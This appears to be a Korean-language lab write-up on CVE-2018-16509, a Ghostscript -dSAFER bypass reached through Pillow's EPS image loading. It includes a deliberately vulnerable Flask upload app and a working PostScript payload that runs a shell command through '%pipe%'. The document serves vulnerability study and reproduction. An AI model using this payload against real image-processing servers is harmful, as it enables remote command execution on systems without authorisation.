# Python PIL/Pillow를 통한 Ghostscript 원격 쉘 명령 실행 CVE-2018-16509

Ghostscript는 Adobe Systems의 PostScript 및 Portable Document Format (PDF) 페이지 설명 언어에 대한 인터프리터를 기반으로 하는 소프트웨어 스위트입니다. 어떤 이유로든 Ghostscript는 어떤 애플리케이션이 직접 사용하지 않더라도 프로덕션 서버에 존재합니다 (예: `/usr/local/bin/gs` 또는 `/usr/bin/gs`). 왜냐하면 Ghostscript는 다른 소프트웨어 (예: ImageMagick)의 종속성으로 설치되기 때문입니다. Ghostscript에는 여러 가지 취약점이 발견되었으며, 그 중 하나는 CVE-2018-16509입니다. 이는 Google Project Zero의 Tavis Ormandy가 발견한 취약점으로, PostScript에서 실패한 복원 (grestore)을 처리하여 LockSafetyParams를 비활성화하고 invalidaccess를 피함으로써 v9.24 이전의 Ghostscript에서 -dSAFER 우회를 이용해 임의의 명령을 실행할 수 있게 합니다. 이 취약점은 ImageMagick 라이브러리나 Ghotscript 래퍼가 있는 프로그래밍 언어의 이미지 라이브러리 (이 예제에서는 PIL/Pillow)를 통해 접근할 수 있습니다.

## 공격

서버에서 `touch /tmp/got_rce`를 실행하려면 [rce.jpg](rce.jpg) (특별히 제작된 EPS 이미지, 실제 JPG가 아님)를 업로드할 수 있습니다. 증명을 위해 `docker exec [CONTAINER_ID] ls -alt /tmp`를 실행할 수 있습니다. `CONTAINER_ID`를 얻으려면 `docker container ls`를 확인하십시오. 쉘 실행을 다른 명령으로 변경하려면 `rce.jpg`에서 `touch /tmp/got_rce`를 직접 변경할 수 있습니다.

## 분석

Tavis Ormandy가 [oss-security](https://seclists.org/oss-sec/2018/q3/142)에서 취약점에 대한 설명을 참조할 수 있습니다.

PIL/Pillow의 Ghostscript 래퍼 소스 코드는 [EPSImagePlugin.py](https://github.com/python-pillow/Pillow/blob/0adeb82e9886cdedb3917e8ddfaf46f69556a991/src/PIL/EpsImagePlugin.py)에서 확인할 수 있습니다.

This is the vulnerable code of `app.py`:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        file = request.files.get('image', None)

        if not file:
            flash('No image found')
            return redirect(request.url)

        filename = file.filename
        ext = path.splitext(filename)[1]

        if (ext not in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            flash('Invalid extension')
            return redirect(request.url)

        tmp = tempfile.mktemp("test")
        img_path = "{}.{}".format(tmp, ext)

        file.save(img_path)

        img = Image.open(img_path)
        w, h = img.size
        ratio = 256.0 / max(w, h)

        resized_img = img.resize((int(w * ratio), int(h * ratio)))
        resized_img.save(img_path)
```

업로드된 파일의 내용은 `img = Image.open(img_path)`에 의해 로드됩니다. PIL은 이미지가 EPS 이미지인지 자동으로 감지합니다 (예: 파일 시작 부분에 `%!PS-Adobe-3.0 EPSF-3.0` 추가)하고 `EPSImagePlugin.py`의 `EpsImageFile` 클래스에서 _open()을 호출합니다. `raise IOError("cannot determine EPS bounding box")`를 피하기 위해 파일에 바운딩 박스를 추가해야 합니다 (예: `%%BoundingBox: -0 -0 100 100`).

EPS 이미지의 본문은 `subprocess`를 통해 Ghostscript 바이너리로 처리됩니다. 이는 `EPSImagePlugin.py`의 `Ghostscript` 함수에서 볼 수 있습니다.

```python
    # Build Ghostscript command
    command = ["gs",
               "-q",                         # quiet mode
               "-g%dx%d" % size,             # set output geometry (pixels)
               "-r%fx%f" % res,              # set input DPI (dots per inch)
               "-dBATCH",                    # exit after processing
               "-dNOPAUSE",                  # don't pause between pages
               "-dSAFER",                    # safe mode
               "-sDEVICE=ppmraw",            # ppm driver
               "-sOutputFile=%s" % outfile,  # output file
               "-c", "%d %d translate" % (-bbox[0], -bbox[1]),
                                             # adjust for image origin
               "-f", infile,                 # input file
               "-c", "showpage",             # showpage (see: https://bugs.ghostscript.com/show_bug.cgi?id=698272)
               ]


    ....

    try:
        with open(os.devnull, 'w+b') as devnull:
            startupinfo = None
            if sys.platform.startswith('win'):
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.check_call(command, stdin=devnull, stdout=devnull,
                                  startupinfo=startupinfo)
```

위의 코드는 [Image.py](https://github.com/python-pillow/Pillow/blob/0adeb82e9886cdedb3917e8ddfaf46f69556a991/src/PIL/Image.py)에서 `load`가 호출될 때 호출됩니다. 따라서 이미지를 열기만 해도 취약점이 트리거되지 않습니다. `resize`, `crop`, `rotate`, `save`와 같은 함수는 `load`를 호출하고 취약점을 트리거합니다.

Tavis Ormandy의 POC와 결합하여 원격 쉘 명령 실행을 위한 `rce.jpg`를 제작할 수 있습니다.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```
